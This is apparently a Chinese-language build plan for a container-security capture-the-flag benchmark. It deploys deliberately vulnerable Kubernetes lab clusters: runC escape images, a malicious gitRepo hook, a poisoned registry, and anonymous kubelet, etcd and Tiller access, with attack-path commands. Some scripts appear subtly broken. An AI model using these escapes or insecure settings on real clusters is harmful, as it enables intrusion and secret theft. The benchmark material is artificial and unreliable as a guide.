# Phase 4: K8s 全量场景 (3-4天)

> **Phase 1 修正**: KIND 集群内拉取 Docker Hub 镜像可能超时。解法：所有 `deploy.sh` 添加 `kind load docker-image <image>` 在 `kind create cluster` 之前预加载镜像。

## 目标

完成 10 个 K8s 场景部署。Phase 1 已完成 K8S-06 (RBAC)，本阶段完成剩余 9 个。K8S-04 (NVIDIA GPU) 需物理 GPU，标记为可选。

---

## 前置检查

```bash
kind version          # >= 0.20
kubectl version --client  # >= 1.27
docker version        # KIND 需要 Docker

# 确认 Phase 1 K8S-06 已完成
ls benchmarks/cve_challenges/k8s/rbac-secrets/

# 预拉取 KIND node image
docker pull kindest/node:v1.27.3@sha256:3966ac761ae0136263ffdb6cfd4db23ef8a83cba8a463690e98317add2c9ba72
docker pull kindest/node:v1.28.12@sha256:... # 备用
docker pull registry:2.8.3
docker pull bitnami/kubectl:1.27
```

---

## KIND 通用脚本模式

所有 K8s 场景遵循统一模式：

```
k8s/<scenario>/
  kind-config.yaml     # KIND 集群配置
  deploy.sh            # 创建 KIND 集群 + apply resources
  teardown.sh          # 删除 KIND 集群
  resources/           # kubectl manifest 文件
    scenario.yaml      # 场景脆弱资源配置
```

**通用 deploy.sh 模板**:
```bash
#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-scenario-$(basename "$SCRIPT_DIR")"

kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"
kubectl apply -f "$SCRIPT_DIR/resources/"

echo "[+] Cluster $CLUSTER_NAME ready"
kubectl cluster-info
```

---

## Day 1: 容器逃逸 (K8S-01, K8S-02)

### 场景 K8S-01: runC WORKDIR 逃逸 (CVE-2024-21626)

```bash
mkdir -p benchmarks/cve_challenges/k8s/runc-cve-2024-21626/resources
```

**kind-config.yaml**:
```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3@sha256:3966ac761ae0136263ffdb6cfd4db23ef8a83cba8a463690e98317add2c9ba72
    extraMounts:
      - hostPath: /tmp/cve-flags
        containerPath: /flags
```

**resources/malicious-pod.yaml**:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-poc
  namespace: default
spec:
  containers:
    - name: escape
      image: busybox:1.36
      command: ["sleep", "3600"]
      securityContext:
        privileged: false
  restartPolicy: Never
```

**deploy.sh**:
```bash
#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-01-runc-escape"

FLAG="${CVE_FLAG:-flag{k8s-01-default}}"
mkdir -p /tmp/cve-flags
echo "$FLAG" > /tmp/cve-flags/flag.txt

kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"

# 构建恶意镜像 (WORKDIR=/proc/self/fd/7)
cat > /tmp/Dockerfile.escape << 'DOCKERFILE'
FROM busybox:1.36
WORKDIR /proc/self/fd/7
CMD ["sleep", "3600"]
DOCKERFILE

docker build -t localhost/escape-poc:latest -f /tmp/Dockerfile.escape .
kind load docker-image localhost/escape-poc:latest --name "$CLUSTER_NAME"

# 应用 pod
kubectl apply -f - << 'POD'
apiVersion: v1
kind: Pod
metadata:
  name: escape-poc
spec:
  containers:
    - name: escape
      image: localhost/escape-poc:latest
      command: ["sleep", "3600"]
POD

echo "[+] K8S-01 ready. Flag at /flags/flag.txt on host."
echo "[+] Attack path: kubectl exec escape-poc -- ls ../../../flags/"
```

**teardown.sh**:
```bash
#!/bin/bash
kind delete cluster --name cve-k8s-01-runc-escape
rm -rf /tmp/cve-flags
```

---

### 场景 K8S-02: runC /dev/null 符号链接逃逸 (CVE-2025-31133)

```bash
mkdir -p benchmarks/cve_challenges/k8s/runc-cve-2025-31133/resources
```

**kind-config.yaml** (同 K8S-01，复用 v1.27.3):
```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3@sha256:3966ac761ae0136263ffdb6cfd4db23ef8a83cba8a463690e98317add2c9ba72
    extraMounts:
      - hostPath: /tmp/cve-flags-k8s02
        containerPath: /flags
```

**deploy.sh**:
```bash
#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-02-runc-null"

FLAG="${CVE_FLAG:-flag{k8s-02-default}}"
mkdir -p /tmp/cve-flags-k8s02
echo "$FLAG" > /tmp/cve-flags-k8s02/flag.txt

kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"

# 构建恶意镜像 (将 /dev/null 替换为 symlink)
cat > /tmp/Dockerfile.null << 'DOCKERFILE'
FROM busybox:1.36
RUN rm /dev/null && ln -s /proc/1/root/tmp/escape_target /dev/null
CMD ["sleep", "3600"]
DOCKERFILE

docker build -t localhost/null-escape:latest -f /tmp/Dockerfile.null .
kind load docker-image localhost/null-escape:latest --name "$CLUSTER_NAME"

kubectl apply -f - << 'POD'
apiVersion: v1
kind: Pod
metadata:
  name: null-escape-poc
spec:
  containers:
    - name: escape
      image: localhost/null-escape:latest
      command: ["sleep", "3600"]
POD

echo "[+] K8S-02 ready"
```

**teardown.sh**:
```bash
#!/bin/bash
kind delete cluster --name cve-k8s-02-runc-null
rm -rf /tmp/cve-flags-k8s02
```

---

## Day 2: 容器逃逸 (K8S-03, K8S-05) + 供应链 (K8S-09)

### 场景 K8S-03: runC LSM 绕过 (CVE-2025-52881)

```bash
mkdir -p benchmarks/cve_challenges/k8s/runc-cve-2025-52881
```

K8S-03 结构与 K8S-01/02 相同。关键区别：需要在 KIND node 上启用 AppArmor。

**kind-config.yaml** (需要 AppArmor):
```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3@sha256:3966ac761ae0136263ffdb6cfd4db23ef8a83cba8a463690e98317add2c9ba72
    extraMounts:
      - hostPath: /tmp/cve-flags-k8s03
        containerPath: /flags
    kubeadmConfigPatches:
      - |
        kind: InitConfiguration
        nodeRegistration:
          kubeletExtraArgs:
            feature-gates: "AppArmor=true"
```

其余文件结构与 K8S-02 类似（替换特定的恶意镜像内容）。

> 注意：如果 AppArmor 在 KIND 环境中不可用，此场景可标记为 "require bare-metal or full K8s cluster"，提供外部 K8s 集群的部署说明作为备选。

---

### 场景 K8S-05: gitRepo 卷逃逸 (CVE-2024-10220)

```bash
mkdir -p benchmarks/cve_challenges/k8s/gitrepo-cve-2024-10220/resources
```

**kind-config.yaml** (需要 K8s 1.28.x，gitRepo 在 1.29+ 被废弃):
```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.28.12  # gitRepo volume 可用
    extraMounts:
      - hostPath: /tmp/cve-flags-k8s05
        containerPath: /flags
```

**resources/gitrepo-pod.yaml**:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: gitrepo-escape
spec:
  containers:
    - name: test
      image: busybox:1.36
      command: ["sleep", "3600"]
      volumeMounts:
        - name: gitrepo
          mountPath: /git
  volumes:
    - name: gitrepo
      gitRepo:
        repository: "https://github.com/attacker-controlled/malicious-repo.git"
        revision: "main"
        directory: "."
```

**deploy.sh** 创建本地恶意 Git 仓库 + 注入 hook:
```bash
#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-05-gitrepo"

# 创建本地恶意 Git 仓库（含 post-checkout hook）
mkdir -p /tmp/malicious-git-repo
cd /tmp/malicious-git-repo
git init
git config user.email "attacker@evil.com"
git config user.name "attacker"
echo "test" > README.md
git add README.md
git commit -m "init"

# 注入恶意 post-checkout hook
cat > .git/hooks/post-checkout << 'HOOK'
#!/bin/bash
cat /flags/flag.txt > /tmp/exfiltrated-flag
HOOK
chmod +x .git/hooks/post-checkout

# 更新 pod manifest 指向本地仓库
# ... (使用 file:// 或本地 HTTP server)

FLAG="${CVE_FLAG:-flag{k8s-05-default}}"
mkdir -p /tmp/cve-flags-k8s05
echo "$FLAG" > /tmp/cve-flags-k8s05/flag.txt

kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"
kubectl apply -f "$SCRIPT_DIR/resources/gitrepo-pod.yaml"

echo "[+] K8S-05 ready"
```

---

### 场景 K8S-09: 私有镜像仓库投毒

```bash
mkdir -p benchmarks/cve_challenges/k8s/registry-poison/resources
```

**docker-compose.yml** (用于运行私有 registry):
```yaml
services:
  registry:
    image: registry:2.8.3
    ports:
      - "5000:5000"
    environment:
      REGISTRY_HTTP_TLS_ENABLED: "false"  # HTTP 无 TLS
```

**deploy.sh**:
```bash
#!/bin/bash
set -euo pipefail
CLUSTER_NAME="cve-k8s-09-registry"

# 启动私有 registry
docker compose up -d

# 推送恶意镜像到私有 registry
docker pull nginx:1.25-alpine
docker tag nginx:1.25-alpine localhost:5000/nginx:backdoored
# 注入后门 layer
cat > /tmp/Dockerfile.backdoor << 'DOCKERFILE'
FROM localhost:5000/nginx:backdoored
RUN echo "flag{k8s-09-placeholder}" > /usr/share/nginx/html/flag.html
DOCKERFILE
docker build -t localhost:5000/malicious-nginx:latest -f /tmp/Dockerfile.backdoor .
docker push localhost:5000/malicious-nginx:latest

# 创建 KIND 集群（配置使用该 registry）
kind create cluster --name "$CLUSTER_NAME" --config kind-config.yaml

# 部署使用恶意镜像的 Deployment
kubectl apply -f - << 'DEPLOY'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: registry-target
spec:
  replicas: 1
  selector:
    matchLabels:
      app: registry-target
  template:
    metadata:
      labels:
        app: registry-target
    spec:
      containers:
        - name: app
          image: localhost:5000/malicious-nginx:latest
          ports:
            - containerPort: 80
DEPLOY

echo "[+] K8S-09 ready. Flag at http://<pod-ip>/flag.html"
```

---

## Day 3: 集群控制平面 (K8S-07, K8S-08, K8S-10)

### 场景 K8S-07: Kubelet API 未授权

```bash
mkdir -p benchmarks/cve_challenges/k8s/kubelet-unauth/resources
```

**kind-config.yaml** (启用匿名 kubelet 访问):
```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3@sha256:3966ac761ae0136263ffdb6cfd4db23ef8a83cba8a463690e98317add2c9ba72
    kubeadmConfigPatches:
      - |
        kind: InitConfiguration
        nodeRegistration:
          kubeletExtraArgs:
            anonymous-auth: "true"
            authorization-mode: "AlwaysAllow"
```

**deploy.sh**:
```bash
#!/bin/bash
set -euo pipefail
CLUSTER_NAME="cve-k8s-07-kubelet"

FLAG="${CVE_FLAG:-flag{k8s-07-default}}"
kubectl create namespace flag-ns --dry-run=client -o yaml | kubectl apply -f -

# flag 以环境变量形式注入特权 pod
kubectl apply -f - << 'POD'
apiVersion: v1
kind: Pod
metadata:
  name: flag-holder
  namespace: flag-ns
spec:
  containers:
    - name: nginx
      image: nginx:1.25-alpine
      env:
        - name: FLAG
          value: "${CVE_FLAG}"
POD

echo "[+] K8S-07 ready. Kubelet at https://<node-ip>:10250"
```

**攻击路径**: `curl -k https://<node-ip>:10250/pods` → 找到 flag-holder pod → `curl -k https://<node-ip>:10250/run/flag-ns/flag-holder/nginx -d "cmd=echo \$FLAG"` → 获取 flag

---

### 场景 K8S-08: etcd 未授权

```bash
mkdir -p benchmarks/cve_challenges/k8s/etcd-unauth/resources
```

**kind-config.yaml** (暴露 etcd 端口):
```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3@sha256:3966ac761ae0136263ffdb6cfd4db23ef8a83cba8a463690e98317add2c9ba72
    extraPortMappings:
      - containerPort: 2379
        hostPort: 2379
```

**deploy.sh**:
```bash
#!/bin/bash
set -euo pipefail
CLUSTER_NAME="cve-k8s-08-etcd"

kind create cluster --name "$CLUSTER_NAME" --config kind-config.yaml

# flag 以 Secret 存储
FLAG="${CVE_FLAG:-flag{k8s-08-default}}"
kubectl create secret generic etcd-flag \
  --from-literal=flag="$FLAG" \
  --namespace=kube-system

echo "[+] K8S-08 ready. etcd at localhost:2379"
```

**攻击路径**: `etcdctl --endpoints=http://localhost:2379 get /registry/secrets/kube-system/etcd-flag` → 读取 Kubernetes Secret

---

### 场景 K8S-10: Helm v2 Tiller

```bash
mkdir -p benchmarks/cve_challenges/k8s/helm-tiller/resources
```

**deploy.sh**:
```bash
#!/bin/bash
set -euo pipefail
CLUSTER_NAME="cve-k8s-10-helm"

kind create cluster --name "$CLUSTER_NAME" --config kind-config.yaml

# 安装 Tiller (Helm v2)
kubectl create serviceaccount tiller -n kube-system
kubectl create clusterrolebinding tiller-cluster-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:tiller

helm init --service-account tiller --history-max=5

FLAG="${CVE_FLAG:-flag{k8s-10-default}}"
kubectl create secret generic helm-flag --from-literal=flag="$FLAG" -n kube-system

echo "[+] K8S-10 ready. Tiller at tiller-deploy.kube-system:44134"
```

**攻击路径**: `helm --host tiller-deploy.kube-system:44134 ls` → Tiller 未认证 → `helm install malicious-chart` → 集群管理员权限 → `kubectl get secret helm-flag -n kube-system`

---

## Day 4: GPU 场景 (K8S-04) + 综合验证

### 场景 K8S-04: NVIDIA Container Toolkit (CVE-2024-0132) [可选]

此场景需要物理 GPU 和 NVIDIA drivers。如果当前环境无 GPU，创建文档性部署说明并标记为 `optional-gpu`:

```bash
mkdir -p benchmarks/cve_challenges/k8s/nvidia-cve-2024-0132

cat > benchmarks/cve_challenges/k8s/nvidia-cve-2024-0132/README.md << 'EOF'
# K8S-04: NVIDIA Container Toolkit Escape (CVE-2024-0132)

## 前置条件
- 物理 NVIDIA GPU
- NVIDIA drivers >= 545
- nvidia-container-toolkit < 1.14.3

## 部署 (在 GPU 节点上)
1. 安装 Kubernetes 1.28+ 集群
2. 安装 NVIDIA GPU Operator
3. 应用 malicious-pod.yaml

## 攻击路径
恶意容器镜像 → TOCTOU 竞争 → 挂载宿主机根文件系统 → 访问容器运行时 socket → 特权容器 → 全集群控制
EOF
```

---

## 更新 scenarios.yaml

```yaml
  k8s-01:
    id: K8S-01
    name: "runC WORKDIR 容器逃逸"
    type: k8s
    difficulty: L2
    path: k8s/runc-cve-2024-21626
    start: ["bash", "deploy.sh"]
    stop: ["bash", "teardown.sh"]
    verify_file: "/flags/flag.txt"

  k8s-02:
    id: K8S-02
    name: "runC /dev/null 容器逃逸"
    type: k8s
    difficulty: L2
    path: k8s/runc-cve-2025-31133
    start: ["bash", "deploy.sh"]
    stop: ["bash", "teardown.sh"]
    verify_file: "/flags/flag.txt"

  k8s-03:
    id: K8S-03
    name: "runC LSM 绕过容器逃逸"
    type: k8s
    difficulty: L3
    path: k8s/runc-cve-2025-52881
    start: ["bash", "deploy.sh"]
    stop: ["bash", "teardown.sh"]
    verify_file: "/flags/flag.txt"

  k8s-04:
    id: K8S-04
    name: "NVIDIA Container Toolkit 逃逸 [GPU可选]"
    type: k8s
    difficulty: L3
    path: k8s/nvidia-cve-2024-0132
    start: ["echo", "需物理 GPU"]
    stop: ["echo", "需物理 GPU"]
    optional: true

  k8s-05:
    id: K8S-05
    name: "K8s gitRepo 卷逃逸"
    type: k8s
    difficulty: L2
    path: k8s/gitrepo-cve-2024-10220
    start: ["bash", "deploy.sh"]
    stop: ["bash", "teardown.sh"]
    verify_file: /tmp/exfiltrated-flag

  k8s-07:
    id: K8S-07
    name: "Kubelet API 未授权访问"
    type: k8s
    difficulty: L2
    path: k8s/kubelet-unauth
    start: ["bash", "deploy.sh"]
    stop: ["bash", "teardown.sh"]

  k8s-08:
    id: K8S-08
    name: "etcd 未授权访问"
    type: k8s
    difficulty: L3
    path: k8s/etcd-unauth
    start: ["bash", "deploy.sh"]
    stop: ["bash", "teardown.sh"]

  k8s-09:
    id: K8S-09
    name: "私有镜像仓库投毒"
    type: k8s
    difficulty: L2
    path: k8s/registry-poison
    start: ["bash", "deploy.sh"]
    stop: ["bash", "teardown.sh"]

  k8s-10:
    id: K8S-10
    name: "Helm v2 Tiller 未认证"
    type: k8s
    difficulty: L1
    path: k8s/helm-tiller
    start: ["bash", "deploy.sh"]
    stop: ["bash", "teardown.sh"]
```

---

## 验证清单

```bash
cd /home/kianabin/Darwin/benchmarks/cve_challenges/k8s

# K8S-01: 验证 runC 逃逸
cd runc-cve-2024-21626 && bash deploy.sh
kubectl exec escape-poc -- ls /
# 预期: 能访问宿主机 /flags 目录
bash teardown.sh

# K8S-02
cd ../runc-cve-2025-31133 && bash deploy.sh
# 手动验证 runC 版本 < 1.2.8
bash teardown.sh

# K8S-05: 验证 gitRepo 卷
cd ../gitrepo-cve-2024-10220 && bash deploy.sh
kubectl describe pod gitrepo-escape | grep gitRepo
# 预期: gitRepo volume 已配置
bash teardown.sh

# K8S-07: 验证 Kubelet 匿名
cd ../kubelet-unauth && bash deploy.sh
NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[0].address}')
curl -k "https://${NODE_IP}:10250/pods" 2>/dev/null
# 预期: 无需认证即可获取 pod 列表
bash teardown.sh

# K8S-08: 验证 etcd
cd ../etcd-unauth && bash deploy.sh
etcdctl --endpoints=http://localhost:2379 get / --prefix --keys-only 2>/dev/null | head
# 预期: 无需认证即可列出 key
bash teardown.sh

# 剩余 K8S-03, K8S-09, K8S-10 同理逐场景验证
```

---

## Phase 4 交付物

| # | 目录 | 场景 |
|---|------|------|
| 1 | `k8s/runc-cve-2024-21626/` | K8S-01 |
| 2 | `k8s/runc-cve-2025-31133/` | K8S-02 |
| 3 | `k8s/runc-cve-2025-52881/` | K8S-03 |
| 4 | `k8s/nvidia-cve-2024-0132/README.md` | K8S-04 (文档) |
| 5 | `k8s/gitrepo-cve-2024-10220/` | K8S-05 |
| 6 | `k8s/kubelet-unauth/` | K8S-07 |
| 7 | `k8s/etcd-unauth/` | K8S-08 |
| 8 | `k8s/registry-poison/` | K8S-09 |
| 9 | `k8s/helm-tiller/` | K8S-10 |
